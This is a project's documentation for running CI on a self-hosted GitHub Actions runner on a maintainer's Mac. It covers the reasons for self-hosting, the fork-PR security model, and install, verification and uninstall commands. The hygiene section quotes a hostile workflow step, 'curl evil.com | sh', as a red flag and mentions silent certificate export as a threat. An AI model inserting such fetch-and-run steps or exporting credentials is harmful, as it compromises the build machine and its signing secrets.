# Self-hosted GitHub Actions runner

CI for this repo runs on a self-hosted runner installed on the
maintainer's Mac. This document covers why, the security model, the
install procedure, and how to recover the setup on a fresh machine.

For the release pipeline that uses this runner, see
[releasing.md](releasing.md). The v0.2.0.12 post-mortem that
motivated this setup is captured in releasing.md's "Post-mortem:
lessons from v0.2.0.12" section.

## Why self-hosted

Two reasons combined:

1. **Toolchain parity.** GitHub-hosted macOS runners pin to whichever
   Xcode is `latest-stable` on the runner image, which historically
   lags the maintainer's local Xcode by many months. SwiftUI renders
   `.bordered` buttons differently when compiled against different
   Apple SDKs — Apple keeps both rendering paths alive forever for
   backward compatibility, and the SDK at compile time picks which
   one the binary calls into. The result is that CI-shipped builds
   visually diverge from local dev builds even with identical source
   code. Self-hosted uses whichever Xcode is at
   `/Applications/Xcode.app` on the maintainer's Mac, so the SDK
   matches dev exactly.
2. **Queue time.** GitHub-hosted Apple Silicon runners had 30+ minute
   queue times during peak hours. Self-hosted starts in seconds.

The trade is that the maintainer's Mac is now a build target — see
the security model below.

## Security model

The repo is **public**, which means anyone can fork it and open a PR.
On a default-configured public repo with a self-hosted runner, that
PR could include a modified workflow that auto-executes arbitrary code
on the runner. Two layers of mitigation prevent this:

### Layer 1: GitHub Secrets are not passed to fork PR workflows

By GitHub design, encrypted secrets (`MACOS_CERTIFICATE`,
`MACOS_CERTIFICATE_PASSWORD`, `APPLE_ID_PASSWORD`,
`SPARKLE_PRIVATE_KEY`, etc.) are **never** delivered to a workflow
triggered by a fork pull request, regardless of runner type. So even
if a fork PR's workflow runs on the self-hosted runner, it cannot
read the signing cert, notary credentials, or Sparkle private key.

### Layer 2: Fork PR workflows require explicit approval

The repo's Actions settings are configured to require approval for
fork PRs from all external contributors:

```sh
gh api repos/superic/av-pain-reliever/actions/permissions/fork-pr-contributor-approval
# → {"approval_policy":"all_external_contributors"}
```

Every workflow run from a fork PR is paused at the queue stage until
the maintainer clicks "Approve and run." This means a malicious fork
can't auto-execute on the runner — there's a human in the loop.

To re-set this if it ever drifts:

```sh
gh api --method PUT \
    repos/superic/av-pain-reliever/actions/permissions/fork-pr-contributor-approval \
    -f approval_policy=all_external_contributors
```

### Risk surface that remains

- **Workflows from main and tag pushes still run with full secret
  access**, because those events require write access to the repo.
  Only the maintainer can trigger them. This is the design intent.
- **An approved fork PR's workflow runs as the maintainer's macOS
  user account** with read/write access to `~/`, the unlocked login
  keychain, ssh keys, browser cookies, etc. So review the workflow
  diff in any fork PR carefully before approving — especially
  changes to `.github/workflows/*.yml`.
- **Runner credentials at `~/actions-runner/.credentials` and
  `.runner`** are long-lived auth tokens that let the runner connect
  to GitHub. File perms default to 600 (owner-only); fine on a
  single-user Mac but sensitive on shared systems.

### Hygiene recommendations

- **Verify the Developer ID cert ACL** in Keychain Access. Open the
  cert under login.keychain → Get Info → Access Control. If it's
  "Allow all applications to access this item," tighten to "Confirm
  before allowing" or restrict to specific apps (`codesign`,
  `productsign`). This means a malicious workflow that gets approved
  can't silently export the cert with `security export` — macOS
  prompts the user instead.
- **Don't leave registration tokens lying around.** The one-time
  registration token used during runner install (typically saved to
  `/tmp/runner-token.txt`) is single-use and expires within ~1 hour,
  but delete it after use anyway: `rm /tmp/runner-token.txt`.
- **Treat workflow file changes in fork PRs as red flags.** A diff
  that adds a step like `run: curl evil.com | sh` is the obvious
  bad pattern — but subtler attacks (modifying an existing step,
  exfiltrating env vars, etc.) need careful review too.

## Install procedure

These are the commands run during the original v0.2.0.12 setup. Use
them again if recovering on a fresh Mac.

### 1. Get a registration token (one-time, ~1h TTL)

```sh
gh api --method POST \
    repos/superic/av-pain-reliever/actions/runners/registration-token \
    --jq .token > /tmp/runner-token.txt
```

### 2. Download + extract the runner

```sh
mkdir -p ~/actions-runner && cd ~/actions-runner
LATEST_URL=$(gh api repos/actions/runner/releases/latest \
    --jq '.assets[] | select(.name | contains("osx-arm64") and contains(".tar.gz") and (contains("noruntime") | not)) | .browser_download_url')
curl -fLso runner.tar.gz "$LATEST_URL"
tar xzf runner.tar.gz && rm runner.tar.gz
```

### 3. Register with the repo

```sh
cd ~/actions-runner && ./config.sh \
    --url https://github.com/superic/av-pain-reliever \
    --token "$(cat /tmp/runner-token.txt)" \
    --name avpain-mac \
    --labels self-hosted,macos-arm64,xcode-26-4-1 \
    --unattended \
    --replace
```

The custom `xcode-26-4-1` label is what the workflows match on (see
`.github/workflows/release.yml` and `test.yml`'s `runs-on:` field).

### 4. Install + start as a LaunchAgent

```sh
cd ~/actions-runner && ./svc.sh install && ./svc.sh start
```

This installs to `~/Library/LaunchAgents/actions.runner.<owner>-<repo>.<runner-name>.plist`
and starts polling GitHub for jobs. The runner only runs while the
maintainer is logged in (LaunchAgent, not LaunchDaemon).

### 5. Clean up the token file

```sh
rm /tmp/runner-token.txt
```

### 6. Verify

```sh
# From inside the runner directory:
cd ~/actions-runner && ./svc.sh status

# From anywhere — confirms the runner is registered + online:
gh api repos/superic/av-pain-reliever/actions/runners \
    --jq '.runners[] | {name, status, busy, labels: [.labels[].name]}'
```

Expected output: `status: online`, `busy: false`, labels including
`self-hosted`, `macos-arm64`, `xcode-26-4-1`.

## Lockstep rule for Xcode

The runner uses whichever Xcode is at `/Applications/Xcode.app` on
the maintainer's Mac (no `Select Xcode` step in the workflows). So:

- **Bumping local Xcode automatically bumps CI.** Next workflow run
  picks up the new toolchain.
- **The `xcode-26-4-1` label is informational, not enforcing.** It
  doesn't actually pin Xcode — it just documents which version the
  runner was set up with. If you upgrade local Xcode, also rename
  the label so it stays accurate (re-register with new `--labels`
  flag, then update `runs-on:` in both workflow files in lockstep).
- **The first build after a local Xcode upgrade is the validation
  point.** Treat it like a toolchain-only release: tag a no-source-
  change version, ship it, byte-compare CI vs dev locally, confirm
  rendering parity. See the
  [releasing.md](releasing.md) "Pre-publish binary verification"
  section.

## Status checks

```sh
# Is the LaunchAgent running?
launchctl list | grep actions.runner

# Is the runner online from GitHub's side?
gh api repos/superic/av-pain-reliever/actions/runners --jq '.runners[]'

# Recent runs the runner has executed:
gh run list --limit 5
```

If `svc.sh status` shows stopped but the LaunchAgent is supposed to
auto-restart on login: `cd ~/actions-runner && ./svc.sh start`.

## Uninstall

Reversible. Run in this order:

```sh
cd ~/actions-runner

# Stop and remove the LaunchAgent
./svc.sh stop
./svc.sh uninstall

# Deregister from GitHub (needs a fresh removal token)
REMOVE_TOKEN=$(gh api --method POST \
    repos/superic/av-pain-reliever/actions/runners/remove-token \
    --jq .token)
./config.sh remove --token "$REMOVE_TOKEN"

# Delete the runner files
cd ~ && rm -rf ~/actions-runner
```

After uninstall, switch the workflows back to a GitHub-hosted runner
by editing `runs-on:` in `release.yml` and `test.yml`. The previous
known-good config was `runs-on: macos-26-arm64` with an explicit
`xcode-version: '26.4.1'` Select Xcode step, but note that
GitHub-hosted Apple Silicon queue times can spike to 30+ minutes
during peak hours.
